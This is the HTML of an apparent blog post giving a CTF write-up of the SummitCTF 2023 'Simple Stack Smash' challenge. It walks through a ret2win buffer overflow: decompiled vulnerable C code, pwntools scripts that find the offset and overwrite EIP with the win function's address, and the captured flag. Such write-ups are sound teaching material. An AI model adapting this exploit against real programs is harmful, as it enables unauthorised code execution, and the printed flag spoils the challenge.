@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Simple Stack Smash (SummitCTF 2023) | Daniel Dinari</title>
+<meta name="keywords" content="PWN, easy, writeup">
+<meta name="description" content="Easy pwn Challenge - ret2win">
+<meta name="author" content="">
+<link rel="canonical" href="/posts/summitctf/simple-stack-smash/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.7d18a705987f821ebb81c2a2b7c2108153c651bb559a2625a1793adca536f83f.css" integrity="sha256-fRinBZh/gh67gcKit8IQgVPGUbtVmiYloXk63KU2&#43;D8=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="/favicon/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png">
+<link rel="apple-touch-icon" href="/favicon/apple-touch-icon.png">
+<link rel="mask-icon" href="/favicon/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4NJWQRTX5H"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4NJWQRTX5H');
+</script>
+<meta property="og:title" content="Simple Stack Smash (SummitCTF 2023)" />
+<meta property="og:description" content="Easy pwn Challenge - ret2win" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/summitctf/simple-stack-smash/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-04-23T22:00:00-05:00" />
+<meta property="article:modified_time" content="2023-04-23T22:00:00-05:00" /><meta property="og:site_name" content="Daniel Dinari" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Simple Stack Smash (SummitCTF 2023)"/>
+<meta name="twitter:description" content="Easy pwn Challenge - ret2win"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "/posts/"
+    }
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Simple Stack Smash (SummitCTF 2023)",
+      "item": "/posts/summitctf/simple-stack-smash/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Simple Stack Smash (SummitCTF 2023)",
+  "name": "Simple Stack Smash (SummitCTF 2023)",
+  "description": "Easy pwn Challenge - ret2win",
+  "keywords": [
+    "PWN", "easy", "writeup"
+  ],
+  "articleBody": "Description Can you perform a simple stack smash? I hope so, you’ll need to in order to reach the summit… (100 points)\nGiven file: simple-stack-smash\n Writeup I’m going to use GDB with the pwndbg plugin for this challenge. Run gdb \nHere is the main function revealed in Ghidra:\nundefined4 main(void) { char name_input [16]; setvbuf(stdout,(char *)0,2,0); setvbuf(stderr,(char *)0,2,0); printf(\"Please enter your name: \"); fgets(name_input,1024,stdin); printf(\"Hello, %s!\\n\",name_input); return 0; } Curiously, there exists a win function:\nvoid win(void) { system(\"cat /src/flag.txt\"); exit(0); } A ret2win challenge, where the objective is to redirect execution to the win function (win_addr). To do so, we need to figure out at what point of our input, the buffer overflow occurs (offset).\nIn gdb, info fun win: gives us the win_addr = 0x08049216\nTo find the offset we send a bunch of strings in the following cyclic pattern: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa.. to find until what letter can the stack hold.\n#!/usr/bin/python3 from pwn import * elf = ELF(\"./simple-stack-smash\") p = elf.process() win_addr = 0x08049216 context.binary = elf context.log_level = \"DEBUG\" gdb.attach(p) p.sendline(cyclic(100)) # send pattern p.interactive() # run script, enter 'c' in gdb to continue We can see in gdb that the program SEGFAULTed when it’s %EIP was pointing to ‘gaaa’ which caused the buffer overflow. If you’re unfamiliar with assembly registers, %EIP is the instruction pointer which tells the computer what the next command is that must be executed. After making %EIP to point to our win function, we get the flag.\n Solve script Completing the script:\n#!/usr/bin/python3 from pwn import * elf = ELF(\"./simple-stack-smash\") p = elf.process() win_addr = 0x08049216 context.binary = elf # context.log_level = \"DEBUG\" # gdb.attach(p) # p.sendline(cyclic(100)) # sending pattern offset = cyclic_find(\"gaaa\") p.sendlineafter(b\"name: \", b\"A\" * offset + p32(win_addr)) p.interactive() Flag summitCTF{G1mMI3_S0M3th1NG_H4rD3r_PlZ}\n ",
+  "wordCount" : "292",
+  "inLanguage": "en",
+  "datePublished": "2023-04-23T22:00:00-05:00",
+  "dateModified": "2023-04-23T22:00:00-05:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "/posts/summitctf/simple-stack-smash/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Daniel Dinari",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "/favicon/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="/" accesskey="h" title="Daniel Dinari  (Alt + H)">
+                <img src="/clueless.png" alt="" aria-label="logo"
+                    height="34">Daniel Dinari </a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="/resume.pdf" title="Resume">
+                    <span>Resume</span>
+                </a>
+            </li>
+            <li>
+                <a href="/placements/" title="Rankings">
+                    <span>Rankings</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="/search/" title="🔍">
+                    <span>🔍</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/posts/">Posts</a></div>
+    <h1 class="post-title">
+      Simple Stack Smash (SummitCTF 2023)
+    </h1>
+    <div class="post-description">
+      Easy pwn Challenge - ret2win
+    </div>
+    <div class="post-meta"><span title='2023-04-23 22:00:00 -0500 -0500'>Apr 23, 2023 </span>&nbsp;·&nbsp;2 min&nbsp;|&nbsp;<a href="https://github.com/doxxedd/dinari.ca/tree/main/content/posts/summitctf/simple-stack-smash.md" rel="noopener noreferrer" target="_blank">Suggest Edit</a>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#description" aria-label="Description">Description</a></li>
+                <li>
+                    <a href="#writeup" aria-label="Writeup">Writeup</a><ul>
+                        
+                <li>
+                    <a href="#solve-script" aria-label="Solve script">Solve script</a></li></ul>
+                </li>
+                <li>
+                    <a href="#flag" aria-label="Flag">Flag</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h2>
+<p>Can you perform a simple stack smash? I hope so, you&rsquo;ll need to in order to reach the summit&hellip; (100 points)</p>
+<p>Given file: <a href="/summitctf-simple-stack-smash/simple-stack-smash">simple-stack-smash</a></p>
+<hr>
+<h2 id="writeup">Writeup<a hidden class="anchor" aria-hidden="true" href="#writeup">#</a></h2>
+<p>I&rsquo;m going to use GDB with the <a href="https://github.com/pwndbg/pwndbg">pwndbg</a> plugin for this challenge. Run <code>gdb &lt;file&gt;</code></p>
+<p><img loading="lazy" src="/summitctf-simple-stack-smash/2023-04-23-21-44-48.png#center" alt="name"  />
+</p>
+<p>Here is the main function revealed in Ghidra:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">undefined4 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+{
+  <span style="color:#66d9ef">char</span> name_input [<span style="color:#ae81ff">16</span>];
+  
+  setvbuf(stdout,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+  setvbuf(stderr,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+  printf(<span style="color:#e6db74">&#34;Please enter your name: &#34;</span>);
+  fgets(name_input,<span style="color:#ae81ff">1024</span>,stdin);
+  printf(<span style="color:#e6db74">&#34;Hello, %s!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,name_input);
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Curiously, there exists a <code>win</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>(<span style="color:#66d9ef">void</span>)
+{
+  system(<span style="color:#e6db74">&#34;cat /src/flag.txt&#34;</span>);
+  exit(<span style="color:#ae81ff">0</span>);
+}
+</code></pre></div><p>A ret2win challenge, where the objective is to redirect execution to the win function (<code>win_addr</code>). To do so, we need to figure out at what point of our input, the buffer overflow occurs (<code>offset</code>).</p>
+<p>In gdb, <code>info fun win</code>: gives us the win_addr =<code> 0x08049216</code></p>
+<p>To find the offset we send a bunch of strings in the following cyclic pattern:
+<code>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa..</code> to find until what letter can the stack hold.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/python3</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./simple-stack-smash&#34;</span>)
+p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08049216</span>
+
+context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;DEBUG&#34;</span>
+gdb<span style="color:#f92672">.</span>attach(p)
+
+p<span style="color:#f92672">.</span>sendline(cyclic(<span style="color:#ae81ff">100</span>))  <span style="color:#75715e"># send pattern</span>
+p<span style="color:#f92672">.</span>interactive()  
+<span style="color:#75715e"># run script, enter &#39;c&#39; in gdb to continue</span>
+</code></pre></div><p>We can see in gdb that the program SEGFAULTed when it&rsquo;s <code>%EIP</code> was pointing to &lsquo;gaaa&rsquo; which caused the buffer overflow. If you&rsquo;re unfamiliar with assembly registers, <code>%EIP</code> is the instruction pointer which tells the computer what the next command is that must be executed. After making <code>%EIP</code> to point to our win function, we get the flag.</p>
+<p><img loading="lazy" src="/summitctf-simple-stack-smash/2023-04-23-23-04.png#center" alt="name"  />
+</p>
+<p> </p>
+<h3 id="solve-script">Solve script<a hidden class="anchor" aria-hidden="true" href="#solve-script">#</a></h3>
+<p>Completing the script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/python3</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./simple-stack-smash&#34;</span>)
+p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08049216</span>
+
+context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
+
+<span style="color:#75715e"># context.log_level = &#34;DEBUG&#34;</span>
+<span style="color:#75715e"># gdb.attach(p)</span>
+<span style="color:#75715e"># p.sendline(cyclic(100))  # sending pattern</span>
+
+offset <span style="color:#f92672">=</span> cyclic_find(<span style="color:#e6db74">&#34;gaaa&#34;</span>)
+
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;name: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset <span style="color:#f92672">+</span> p32(win_addr))
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="flag">Flag<a hidden class="anchor" aria-hidden="true" href="#flag">#</a></h2>
+<p><code>summitCTF{G1mMI3_S0M3th1NG_H4rD3r_PlZ}</code></p>
+<hr>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="/tags/pwn/">PWN</a></li>
+      <li><a href="/tags/easy/">easy</a></li>
+      <li><a href="/tags/writeup/">writeup</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
